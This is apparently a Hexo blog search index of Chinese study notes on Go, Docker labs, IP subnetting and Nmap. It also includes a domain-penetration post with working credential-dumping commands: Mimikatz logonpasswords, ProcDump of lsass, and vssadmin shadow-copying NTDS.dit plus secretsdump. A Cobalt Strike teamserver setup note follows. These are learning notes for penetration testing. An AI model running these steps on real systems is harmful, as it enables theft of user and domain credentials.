<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Golang学习笔记（一）</title>
    <url>/2020/06/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="go的初相遇"><a href="#go的初相遇" class="headerlink" title="go的初相遇"></a>go的初相遇</h1><p>最近接触了下go，顺便记下一些笔记.</p>
<a id="more"></a>

<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>go需要源文件头注明这个文件属于哪个包</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br></pre></td></tr></table></figure>

<p><code>package main</code> 表示这是一个独立的可执行程序，且每个程序都要包含一个main的包。</p>
<p>引用包需要用到<code>import</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br></pre></td></tr></table></figure>

<p>引用fmt的包</p>
<h2 id="变量和常量"><a href="#变量和常量" class="headerlink" title="变量和常量"></a>变量和常量</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明变量用<code>var</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b,c = <span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">d,e := <span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>不可以对已经声明的变量名进行再次声明，且声明的变量一定要使用，在使用前一定得声明，不然都会报错。</p>
<p>go的常用格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(err)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>特殊常量 iota</p>
<p>第一个iota = 0</p>
<p>后面再次使用会自动加一</p>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><p>在go中常用的循环为for循环</p>
<p>其它语言使用无限循环一般为<code>while true</code></p>
<p>在go中，使用<code>for true</code></p>
<p>在go中，有过goto的格式，用来靠转指定的行数</p>
<p>例如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">10</span></span><br><span class="line">  </span><br><span class="line">  LOOP: <span class="keyword">for</span> a &lt; <span class="number">15</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">15</span> &#123;</span><br><span class="line">      a = a+<span class="number">1</span></span><br><span class="line">      <span class="keyword">goto</span> LOOP</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Print(a)</span><br><span class="line">    a++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>go的函数用<code>func</code>声明</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(num1, num2 <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	  <span class="keyword">var</span> result <span class="keyword">int</span></span><br><span class="line">  	result = num1 + num2</span><br><span class="line">  	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要声明变量的类型，以及返回的值的类型</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>go的语法中有数组，其格式为</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test1 [<span class="number">10</span>] <span class="keyword">float32</span>  # <span class="number">10</span>个数组</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test2 [] float&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;  # 自动设置数组大小</span><br></pre></td></tr></table></figure>



<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p>go是可以使用指针的语言，所谓指针，就是指向变量在内存中的地址，使用方法为</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ip *<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">ip = &amp;a</span><br><span class="line"># ip的值就是a变量值内存中的位置的值</span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a></h3><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>和c语言一样，go不是面向对象的语言，使用结构体来存储同一类型的数据。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">		title <span class="keyword">string</span></span><br><span class="line">		author <span class="keyword">string</span></span><br><span class="line">		book_id <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Books&#123;<span class="string">"test_booktitle"</span>, <span class="string">"test_bookauthor"</span>, <span class="number">12345</span>&#125;</span><br><span class="line"></span><br><span class="line">Books&#123;title:<span class="string">"go lang"</span>, author:<span class="string">"whomai"</span>&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记（一）</title>
    <url>/2020/05/31/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Docker的基础学习"><a href="#Docker的基础学习" class="headerlink" title="Docker的基础学习"></a>Docker的基础学习</h1><p>简单记录一下如何利用docker去搭建测试环境</p>
<p>不得不说，有了docker，可以很快的就搭建成一个测试环境，利用测试环境，可以很方便的去复现漏洞。</p>
<a id="more"></a>

<h2 id="docker的基础使用"><a href="#docker的基础使用" class="headerlink" title="docker的基础使用"></a>docker的基础使用</h2><p>先简单的介绍下docker的使用</p>
<p>搜索：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search xxx</span><br></pre></td></tr></table></figure>

<p>下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull xxx</span><br></pre></td></tr></table></figure>

<p>查看docker：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>运行镜像生成一个容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -dt --name sqli -p 80:80</span><br></pre></td></tr></table></figure>

<p>容器的操作：</p>
<p>启动容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start container_name&#x2F;container_id</span><br></pre></td></tr></table></figure>

<p>停止容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop container_name&#x2F;container_id</span><br></pre></td></tr></table></figure>



<p>重启容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker restart container_name&#x2F;container_id</span><br></pre></td></tr></table></figure>





<p>删除容器：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker rm container_name/container_id</span><br></pre></td></tr></table></figure>

<p>删除镜像(需要删除该镜像生成的容器)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi image_name&#x2F;image_id</span><br></pre></td></tr></table></figure>





<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>搭建sqli-labs环境：</p>
<p>步骤：1.运行：docker info   //查看docker信息，确认docker正常</p>
<ul>
<li><p>搜索sqli-labs:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search sqli-labs</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull acgpiano&#x2F;sqli-labs</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -dt --name sqli -p 80:80 --rm acgpiano&#x2F;sqli-labs</span><br></pre></td></tr></table></figure>

<p>参数解释：-dt 后台运行； –name 命名；-p 80:80 将后面的docker容器端口映射到前面的主机端口。</p>
</li>
</ul>
<p>​            </p>
<p>接着，只需要在浏览器打开127.0.0.1就可以了，是不是很简单很方便。</p>
<p>​             进入运行中的docker容器：docker exec -it ID号 /bin/bash</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>IP协议学习笔记</title>
    <url>/2020/04/30/IP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="IP协议学习笔记"><a href="#IP协议学习笔记" class="headerlink" title="IP协议学习笔记"></a>IP协议学习笔记</h1><p><em>回顾下之前所学习过的IP基础知识</em></p>
<hr>
<a id="more"></a>

<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><p>IP协议位于OSI七层参考模型中的网络层，位于TCP/IP分层模型的互联网层（有些资料也称为网络层），在互联网中，主机使用IP地址作为其主机的标识，实现互联网中不同的主机之间数据的转发，IP协议不具有重发性，面向无连接型，属于非可靠性传输协议。本文主要介绍的是IPv4协议。<br>##IPv4<br>IPv4的地址长度为4个八位字节，即32个比特位。<br><br>在windows下cmd查看本机的IP地址的命令为：<code>ipconfig</code><br><br>在linux下查看本机IP地址的命令为：<code>ifconfig</code><br></p>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>IP地址由两个部分组成，一是<strong>“网络标识(地址)”</strong>，二是<strong>“主机标识(地址)”</strong><br><br>常见的IP地址我们把它们分为四大类，A类，B类，C类，D类（其中这四大类不包括从未使用的E类），这四大类是根据IP地址中的前面四位比特列进行划分的<br><br>PS：我们在对IP地址分类的时候，需要把IP地址从十进制数转换成二进制数来进行划分：如<code>192.168.10.11</code>&nbsp;转换成二进制数就是<code>1100 0000 . 1010 1000 . 0000 1010 . 0000 1011</code>(ps:转换成二进制的IP地址是不用<code>.</code>分开的，这里用<code>.</code>分开是为了好分析),通常来说，我们会把一个IP地址分为四个段，A段，B段，C段和D段。每8位数（二进制）作为一个分界点，比如，在<code>192.168.10.11</code>这个IP地址中，<code>192</code>就是这个IP地址的的A段，<code>168</code>就是B段，<code>10</code>就是C段，<code>11</code>就是D段。</p>
<blockquote>
<ol>
<li>A类地址：开头的是0 &nbsp; 其前8位作为网络标识 &nbsp; 后24位作为主机标识 &nbsp; 网络地址的范围是0.0.0.0~127.0.0.0</li>
<li>B类地址：开头的是10 &nbsp; 其前16位作为网络标识 &nbsp; 后16位作为主机标识 &nbsp; 网络地址的范围是128.0.0.0~191.255.0.0</li>
<li>C类地址：开头的是110 &nbsp; 其前24位作为网络标识 &nbsp; 后8位作为主机标识 &nbsp; 网络地址的范围是192.0.0.0~239.255.255.0</li>
<li>D类地址：开头的是1110 &nbsp; 其前32位就是它的网络标识 &nbsp; 无主机标识，常被用于多播 &nbsp; 网络地址的范围是224.0.0.0~239.255.255.255</li>
</ol>
</blockquote>
<h4 id="几个特殊的IP地址"><a href="#几个特殊的IP地址" class="headerlink" title="几个特殊的IP地址"></a>几个特殊的IP地址</h4><blockquote>
<ol>
<li>网络地址：主机位全为0。</li>
<li>广播地址：主机位全为1。</li>
<li>保留地址：<code>0.0.0.0</code>，可以表示整个网络上的IP地址。</li>
<li>回送地址：<code>127.0.0.1</code> &nbsp; 通常，这个地址用于网络软件测试以及本地机进程间通信。比如，我们在本地搭建web服务的时候，默认的访问地址就是<code>127.0.0.1</code></li>
<li>私网地址：仅用于组建专用局域网的主机地址，这些地址通常只用在内网中，不用于公网<br>1个连续的A类地址：<code>10.0.0.0~10.255.255.255</code><br>16个连续的B类地址：<code>172.16.0.0~172.31.255.255</code><br>256个连续的C类地址：<code>192.168.0.0~192.168.255.255</code><br></li>
</ol>
</blockquote>
<p>PS:由于每个网络段都会存在网络地址和广播地址这两个特殊地址，所以我们在计算一个网络段里面能有多少台主机的时候，要减去这两个地址，比如一个C类的网络段里面能容纳的主机个数为:256-2=254</p>
<h3 id="子网与子网掩码"><a href="#子网与子网掩码" class="headerlink" title="子网与子网掩码"></a>子网与子网掩码</h3><p><strong>子网</strong>(Subnet)，简单来讲，就是把A类，B类，C类分类中的部分主机地址拿出来进行网络划分，其作用是把一个IP地址继续细分，分出比A类，B类，C类粒度更小的网络，子网的划分可以让网络管理者更好的管理网络，比如可以用子网划分来对公司部门里面的主机进行划分管理，可以提高IP的地址的利用率。<br><br><strong>子网掩码</strong>(Subnet mask)：用来指明一个IP地址中，那些是网络标识，那些是主机标识，用于划分网络地址和主机地址，子网掩码通常有两种表示方法，一种是直接把网络号用全<code>1</code>表示，另外一种是在IP地址后面添加网络地址数，用<code>/</code>隔开。通过子网掩码，我们可以把IP地址分类成更小的网络或者合并一个大网络。<br><br>比如：<code>192.168.10.11</code>的子网掩码可以表示为：<code>255.255.255.0</code>或者<code>192.168.10.11/24</code>，24表示前面的24位为网络号。<br><br><br>合并网络的<strong>CIDR</strong>(Classless Inter-Domain Routing,无类别域间路由)：通过CIDR可以按任意长度对IP地址中的网络标识和主机标识进行划分。用于解决IPv4地址不足的一种方法。<br><br>例如：合并两个C类地址，利用CIDR将IP地址划分：<code>222.222.192.0/22</code>&nbsp;&nbsp;其网络标识为：<code>1101 1110. 1101 1110. 1100 00</code><br>可以把网络IP范围是：<code>222.222.192.1</code>~<code>222.222.195.254</code>之间的IP地址合并成同一个网络，它们的网络标识都是一样的。</p>
<h5 id="举栗子-："><a href="#举栗子-：" class="headerlink" title="举栗子 ："></a>举栗子 ：</h5><p>栗子1：<strong>IP地址分析</strong></p>
<blockquote>
<p>IP地址为：<code>192.168.10.11/26</code> &nbsp; 二进制表示为：<code>1100 0000 . 1010 1000 . 0000 1010 . 0000 1011</code><br><br>在这个IP地址中，我们可以得知，这是一个私网的C类地址，通常用于内网中，<br><br>其子网掩码为：<code>255.255.255.192</code> &nbsp; 二进制表示为：<code>1111 1111. 1111 1111. 1111 1111. 1100 0000</code><br><br>其网络标识为：<code>192.168.10.0</code> &nbsp; 二进制表示为：<code>1100 0000 . 1010 1000 . 0000 1010 . 00</code><br><br>其主机标识为：<code>11</code> &nbsp; 二进制表示为: <code>00 1011</code><br>其广播地址：<code>192.168.10.63</code> &nbsp; 二进制表示为：<code>1100 0000 . 1010 1000 . 0000 1010 . 0011 1111</code><br></p>
</blockquote>
<p>栗子2：<strong>主机通信1</strong></p>
<blockquote>
<p>主机A的IP地址：<code>192.168.10.11/26</code> &nbsp; 主机B的IP地址：<code>192.168.10.48/24</code><br><br>问：主机A和B之间能否直接通信？<br><br>答案是：可以。我们来分析下：<br><br>A的IP为：<code>192.168.10.11/26</code>&nbsp; 即：<code>1100 0000 . 1010 1000 . 0000 1010 . 0000 1011</code><br><br>B的IP为：<code>192.168.10.48/24</code>&nbsp; 即：<code>1100 0000 . 1010 1000 . 0000 1010 . 0011 0000</code><br><br>显然这两个主机的IP都包含在网络号为：<code>192.168.10.0</code>的网络段里面，它们的网络号相同，所以他们之间可以相互通信。<br></p>
</blockquote>
<p>栗子3：<strong>主机通信2</strong></p>
<blockquote>
<p>主机A的IP地址：<code>192.168.10.148/26</code> &nbsp; 主机B的IP地址：<code>192.168.10.1/24</code><br><br>问：主机A和B之间能否直接通信？<br><br>答案是：不可以。我们来分析下：<br><br>A的IP为：<code>192.168.10.148/26</code>&nbsp; 二进制为：<code>1100 0000 . 1010 1000 . 0000 1010 . 1001 0100</code><br><br>B的IP为：<code>192.168.10.1/24</code>&nbsp; 二进制为：<code>1100 0000 . 1010 1000 . 0000 1010 . 0000 0001</code><br><br>A的网络标识为：<code>192.168.10.128</code>，&nbsp; B的网络标识为：<code>192.168.10.0</code>。它们的网络标识不同，所处的网络段也不同，所以他们的网络不能直接通信。<br></p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap学习笔记（一）</title>
    <url>/2020/03/30/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于：</p>
<a id="more"></a>

<ul>
<li>列举网络主机清单</li>
<li>管理服务升级调度</li>
<li>监控主机</li>
<li>服务运行状况</li>
</ul>
<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。（选自维基百科）</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>端口状态：<br><strong>open(开放的)</strong><br>应用程序正在该端口接收TCP 连接或者UDP报文。<br><strong>closed(关闭的)</strong><br>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。<br><strong>filtered(被过滤的)</strong><br>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。<br><strong>unfiltered(未被过滤的)</strong><br>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭，只有ACK扫描才会出现这种状态。<br><strong>open|filtered(开放或者被过滤的)</strong><br>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。<br><strong>closed|filtered(关闭或者被过滤的)</strong><br>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中</p>
<h2 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h2><blockquote>
<p>nmap的命令众多，在此就不一样列举，只列举一些常用的</p>
</blockquote>
<p> 常见的命令和参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-vv 				对扫描结果进行详细输出</span><br><span class="line">-p &lt;port1,port2...&gt;	对特定端口进行扫描</span><br><span class="line">-p &lt;port1-port2&gt;	对范围内的端口进行扫描</span><br><span class="line">-sP					采用ping扫描</span><br><span class="line">-O					探测操作系统类型</span><br><span class="line">-sV					版本扫描，指纹识别</span><br><span class="line">-sL					列表扫描</span><br><span class="line">-sn					不进行端口扫描，仅用来寻找存活的主机，采用的是Ping扫描</span><br><span class="line">-Pn					不进行ping扫描，跳过主机发现阶段</span><br><span class="line">-sS					采用TCP半开放扫描（root和administrator默认方式），因为未完成三次握手，所以不会留下痕迹</span><br><span class="line">-sT					TCP connect连接，会完成三次握手，留下痕迹</span><br><span class="line">-F					快速扫描		</span><br><span class="line">--top-ports			扫描常见端口</span><br><span class="line">-f					分片扫描，不建议对较旧系统使用</span><br><span class="line">-oX					xml输出</span><br><span class="line">-oN				标准输出</span><br></pre></td></tr></table></figure>

<h2 id="脚本扫描："><a href="#脚本扫描：" class="headerlink" title="脚本扫描："></a>脚本扫描：</h2><p>nmap在扫描的时候可以使用很多脚本<br>在kali下，我们可以用命令    <code>locate *.nse</code> 来查找当前主机所有的NSE脚本</p>
<p>比如对目标进行ms08-07扫描</p>
<p>当然，前期收集的时候，也可以使用-去进行扫描，<br>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-A	次选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测</span><br><span class="line">-Sc	默认脚本扫描</span><br></pre></td></tr></table></figure>

<h2 id="信息收集类脚本："><a href="#信息收集类脚本：" class="headerlink" title="信息收集类脚本："></a>信息收集类脚本：</h2><h3 id="http-methods"><a href="#http-methods" class="headerlink" title="http-methods"></a>http-methods</h3><p>通过这个脚本，可以获取Web服务器支持的HTTP方法<br><code>--script http-methods</code><br>如：<code>nmap -p 80,445 --script http-methods www.baidu.com</code></p>
<h3 id="修改http头"><a href="#修改http头" class="headerlink" title="修改http头:"></a>修改http头:</h3><p>如：<code>nmap -p 80,443 --script http-methods --script-args http.useragent=&quot;Mozilla 42&quot; www.baidu.com</code></p>
<h2 id="高级主机发现类脚本"><a href="#高级主机发现类脚本" class="headerlink" title="高级主机发现类脚本"></a>高级主机发现类脚本</h2><h3 id="broadcast-ping-nse"><a href="#broadcast-ping-nse" class="headerlink" title="broadcast-ping.nse"></a>broadcast-ping.nse</h3><p>作用：发现本地网络中的活跃主机<br>使用：<code>nmap --script broadcast-ping</code></p>
<h3 id="targets-sniffer"><a href="#targets-sniffer" class="headerlink" title="targets-sniffer"></a>targets-sniffer</h3><p>作用：发现本地网络中的所有主机，需要特权模式，也可以使用-e来执行网络监听</p>
<p>使用：<code>nmap -sL --script=targets-sniffer -e &lt;interface&gt;</code></p>
<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>在使用Nmap进行扫描中，尽量不要使用Ping扫描，这是因为Ping扫描的原理是向目标机器发送ICMP报文，而通常情况下，ICMP报文是会被大多数防火墙给过滤掉的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Nmap作为一款十分流行的扫描器，功能还是很强大的，本文也只是对常用的命令做下总结，仅做参考。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透之Hash值的获取</title>
    <url>/2020/02/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BHash%E5%80%BC%E7%9A%84%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<h1 id="域渗透之Hash值的获取"><a href="#域渗透之Hash值的获取" class="headerlink" title="域渗透之Hash值的获取"></a>域渗透之Hash值的获取</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在内网的渗透测试中，会遇到关于域内机器密码的获取的问题，下面进行简单的学习一下。</p>
<a id="more"></a>

<h2 id="普通用户的Hash和密码"><a href="#普通用户的Hash和密码" class="headerlink" title="普通用户的Hash和密码"></a>普通用户的Hash和密码</h2><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>缺点：如果目标机存在杀软，需要进行免杀处理。</p>
<h3 id="ProcDump-Mimikatz"><a href="#ProcDump-Mimikatz" class="headerlink" title="ProcDump + Mimikatz"></a>ProcDump + Mimikatz</h3><p>ProcDump是微软官方的一个小工具，主要目的是用来监测CPU峰值时的应用程序，特点，官方，大多数杀软不会误杀。</p>
<p>思路：在目标机上上传Prodump.exe文件，导出lsass.dmp文件，传回本地用Mimikatz进行读取。</p>
<p>使用方法，将Procdump.exe（64位系统上传Procdump64.exe）上传到目标机，运行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>然后把lsass.dmp文件下载回本地，再用Mimikatz解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::minidump C:\Users\John\Desktop\lsass.dmp</span><br><span class="line">Switch to MINIDUMP : &#39;C:\Users\John\Desktop\lsass.dmp&#39;</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::LogonPasswords full</span><br><span class="line">Opening : &#39;C:\Users\John\Desktop\lsass.dmp&#39; file for minidump...</span><br></pre></td></tr></table></figure>

<p>可以看到导出目前机子所登录过的用户的密码和Hash值。</p>
<h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><p>在域控中，存在一个NTDS文件夹，里面有个ntds.dit文件，ntds.dit是一个AD数据库文件，里面存储着AD域内的所有域用户的帐号和hash，我们只需获取到这个文件，就可以导出当前域环境内的用户的Hash</p>
<p>创建镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;C:</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BHash%E5%80%BC%E7%9A%84%E8%8E%B7%E5%8F%96/CreateSnapshot.jpg" alt></p>
<p>可以看到镜像名为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>

<p>ntds.dit路径为： Shadow Copy Volume Name\Windows\NTDS\NTDS.dit </p>
<p>SYSTEM文件路径为： Shadow Copy Volume Name\Windows\System32\config\SYSTEM</p>
<p>复制NTDS.dit文件和SYSTEM文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit  C:\NTDS.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\SYSTEM</span><br></pre></td></tr></table></figure>



<p>然后使用impacket工具中的一个python脚本进行跑出密码</p>
<p>项目地址：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py</a> </p>
<p>下载和安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;secretsdump.py </span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd examples</span><br><span class="line">python secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL &gt; hash.log</span><br></pre></td></tr></table></figure>

<p>注意如果NTDS.dit和SYSTEM文件不与secretsdump.py文件在同一个目录需要用用到绝对路径。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上简单介绍了两种获取用户hash和账密的方法，导出Hash的方法还有很多，后续再写了…（未完待续）</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike 学习（一）</title>
    <url>/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Cobalt-Strike-学习（一）"><a href="#Cobalt-Strike-学习（一）" class="headerlink" title="Cobalt Strike 学习（一）"></a>Cobalt Strike 学习（一）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike是一款多人协同的渗透测试框架，集成大量的功能，也有人将其形容为带图形界面的MSF，简称CS。</p>
<a id="more"></a>

<p>CS分为客户端和服务端。通常情况下，在外网或其他环境搭建一台服务器，然后通过客户端连上服务器，进行多人协同的渗透测试。</p>
<p>CS运行需要Java环境，且服务端需要Linux环境，在Linux环境下，需要有teamserver和cobaltstrike.jar这两个文件，并放到同一个目录，然后运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver ip passwd  <span class="comment"># ip为服务器的公网ip</span></span><br></pre></td></tr></table></figure>



<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机： Windows7 x64 SP1        192.168.80.145</p>
<p>服务器： Ubuntu Server16.04    192.168.80.144</p>
<p>目标机： Windows 7 x86 SP1        192.168.80.135</p>
<p>首先，把相应的文件放在服务器上，然后启动（需要root权限）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.80.144 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/cs1.jpg" alt></p>
<p>然后攻击机打开客户端，输入ip端口和密码，用户随意</p>
<p><img src="/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/cs2.jpg" alt></p>
<p>然后新建一个Listener</p>
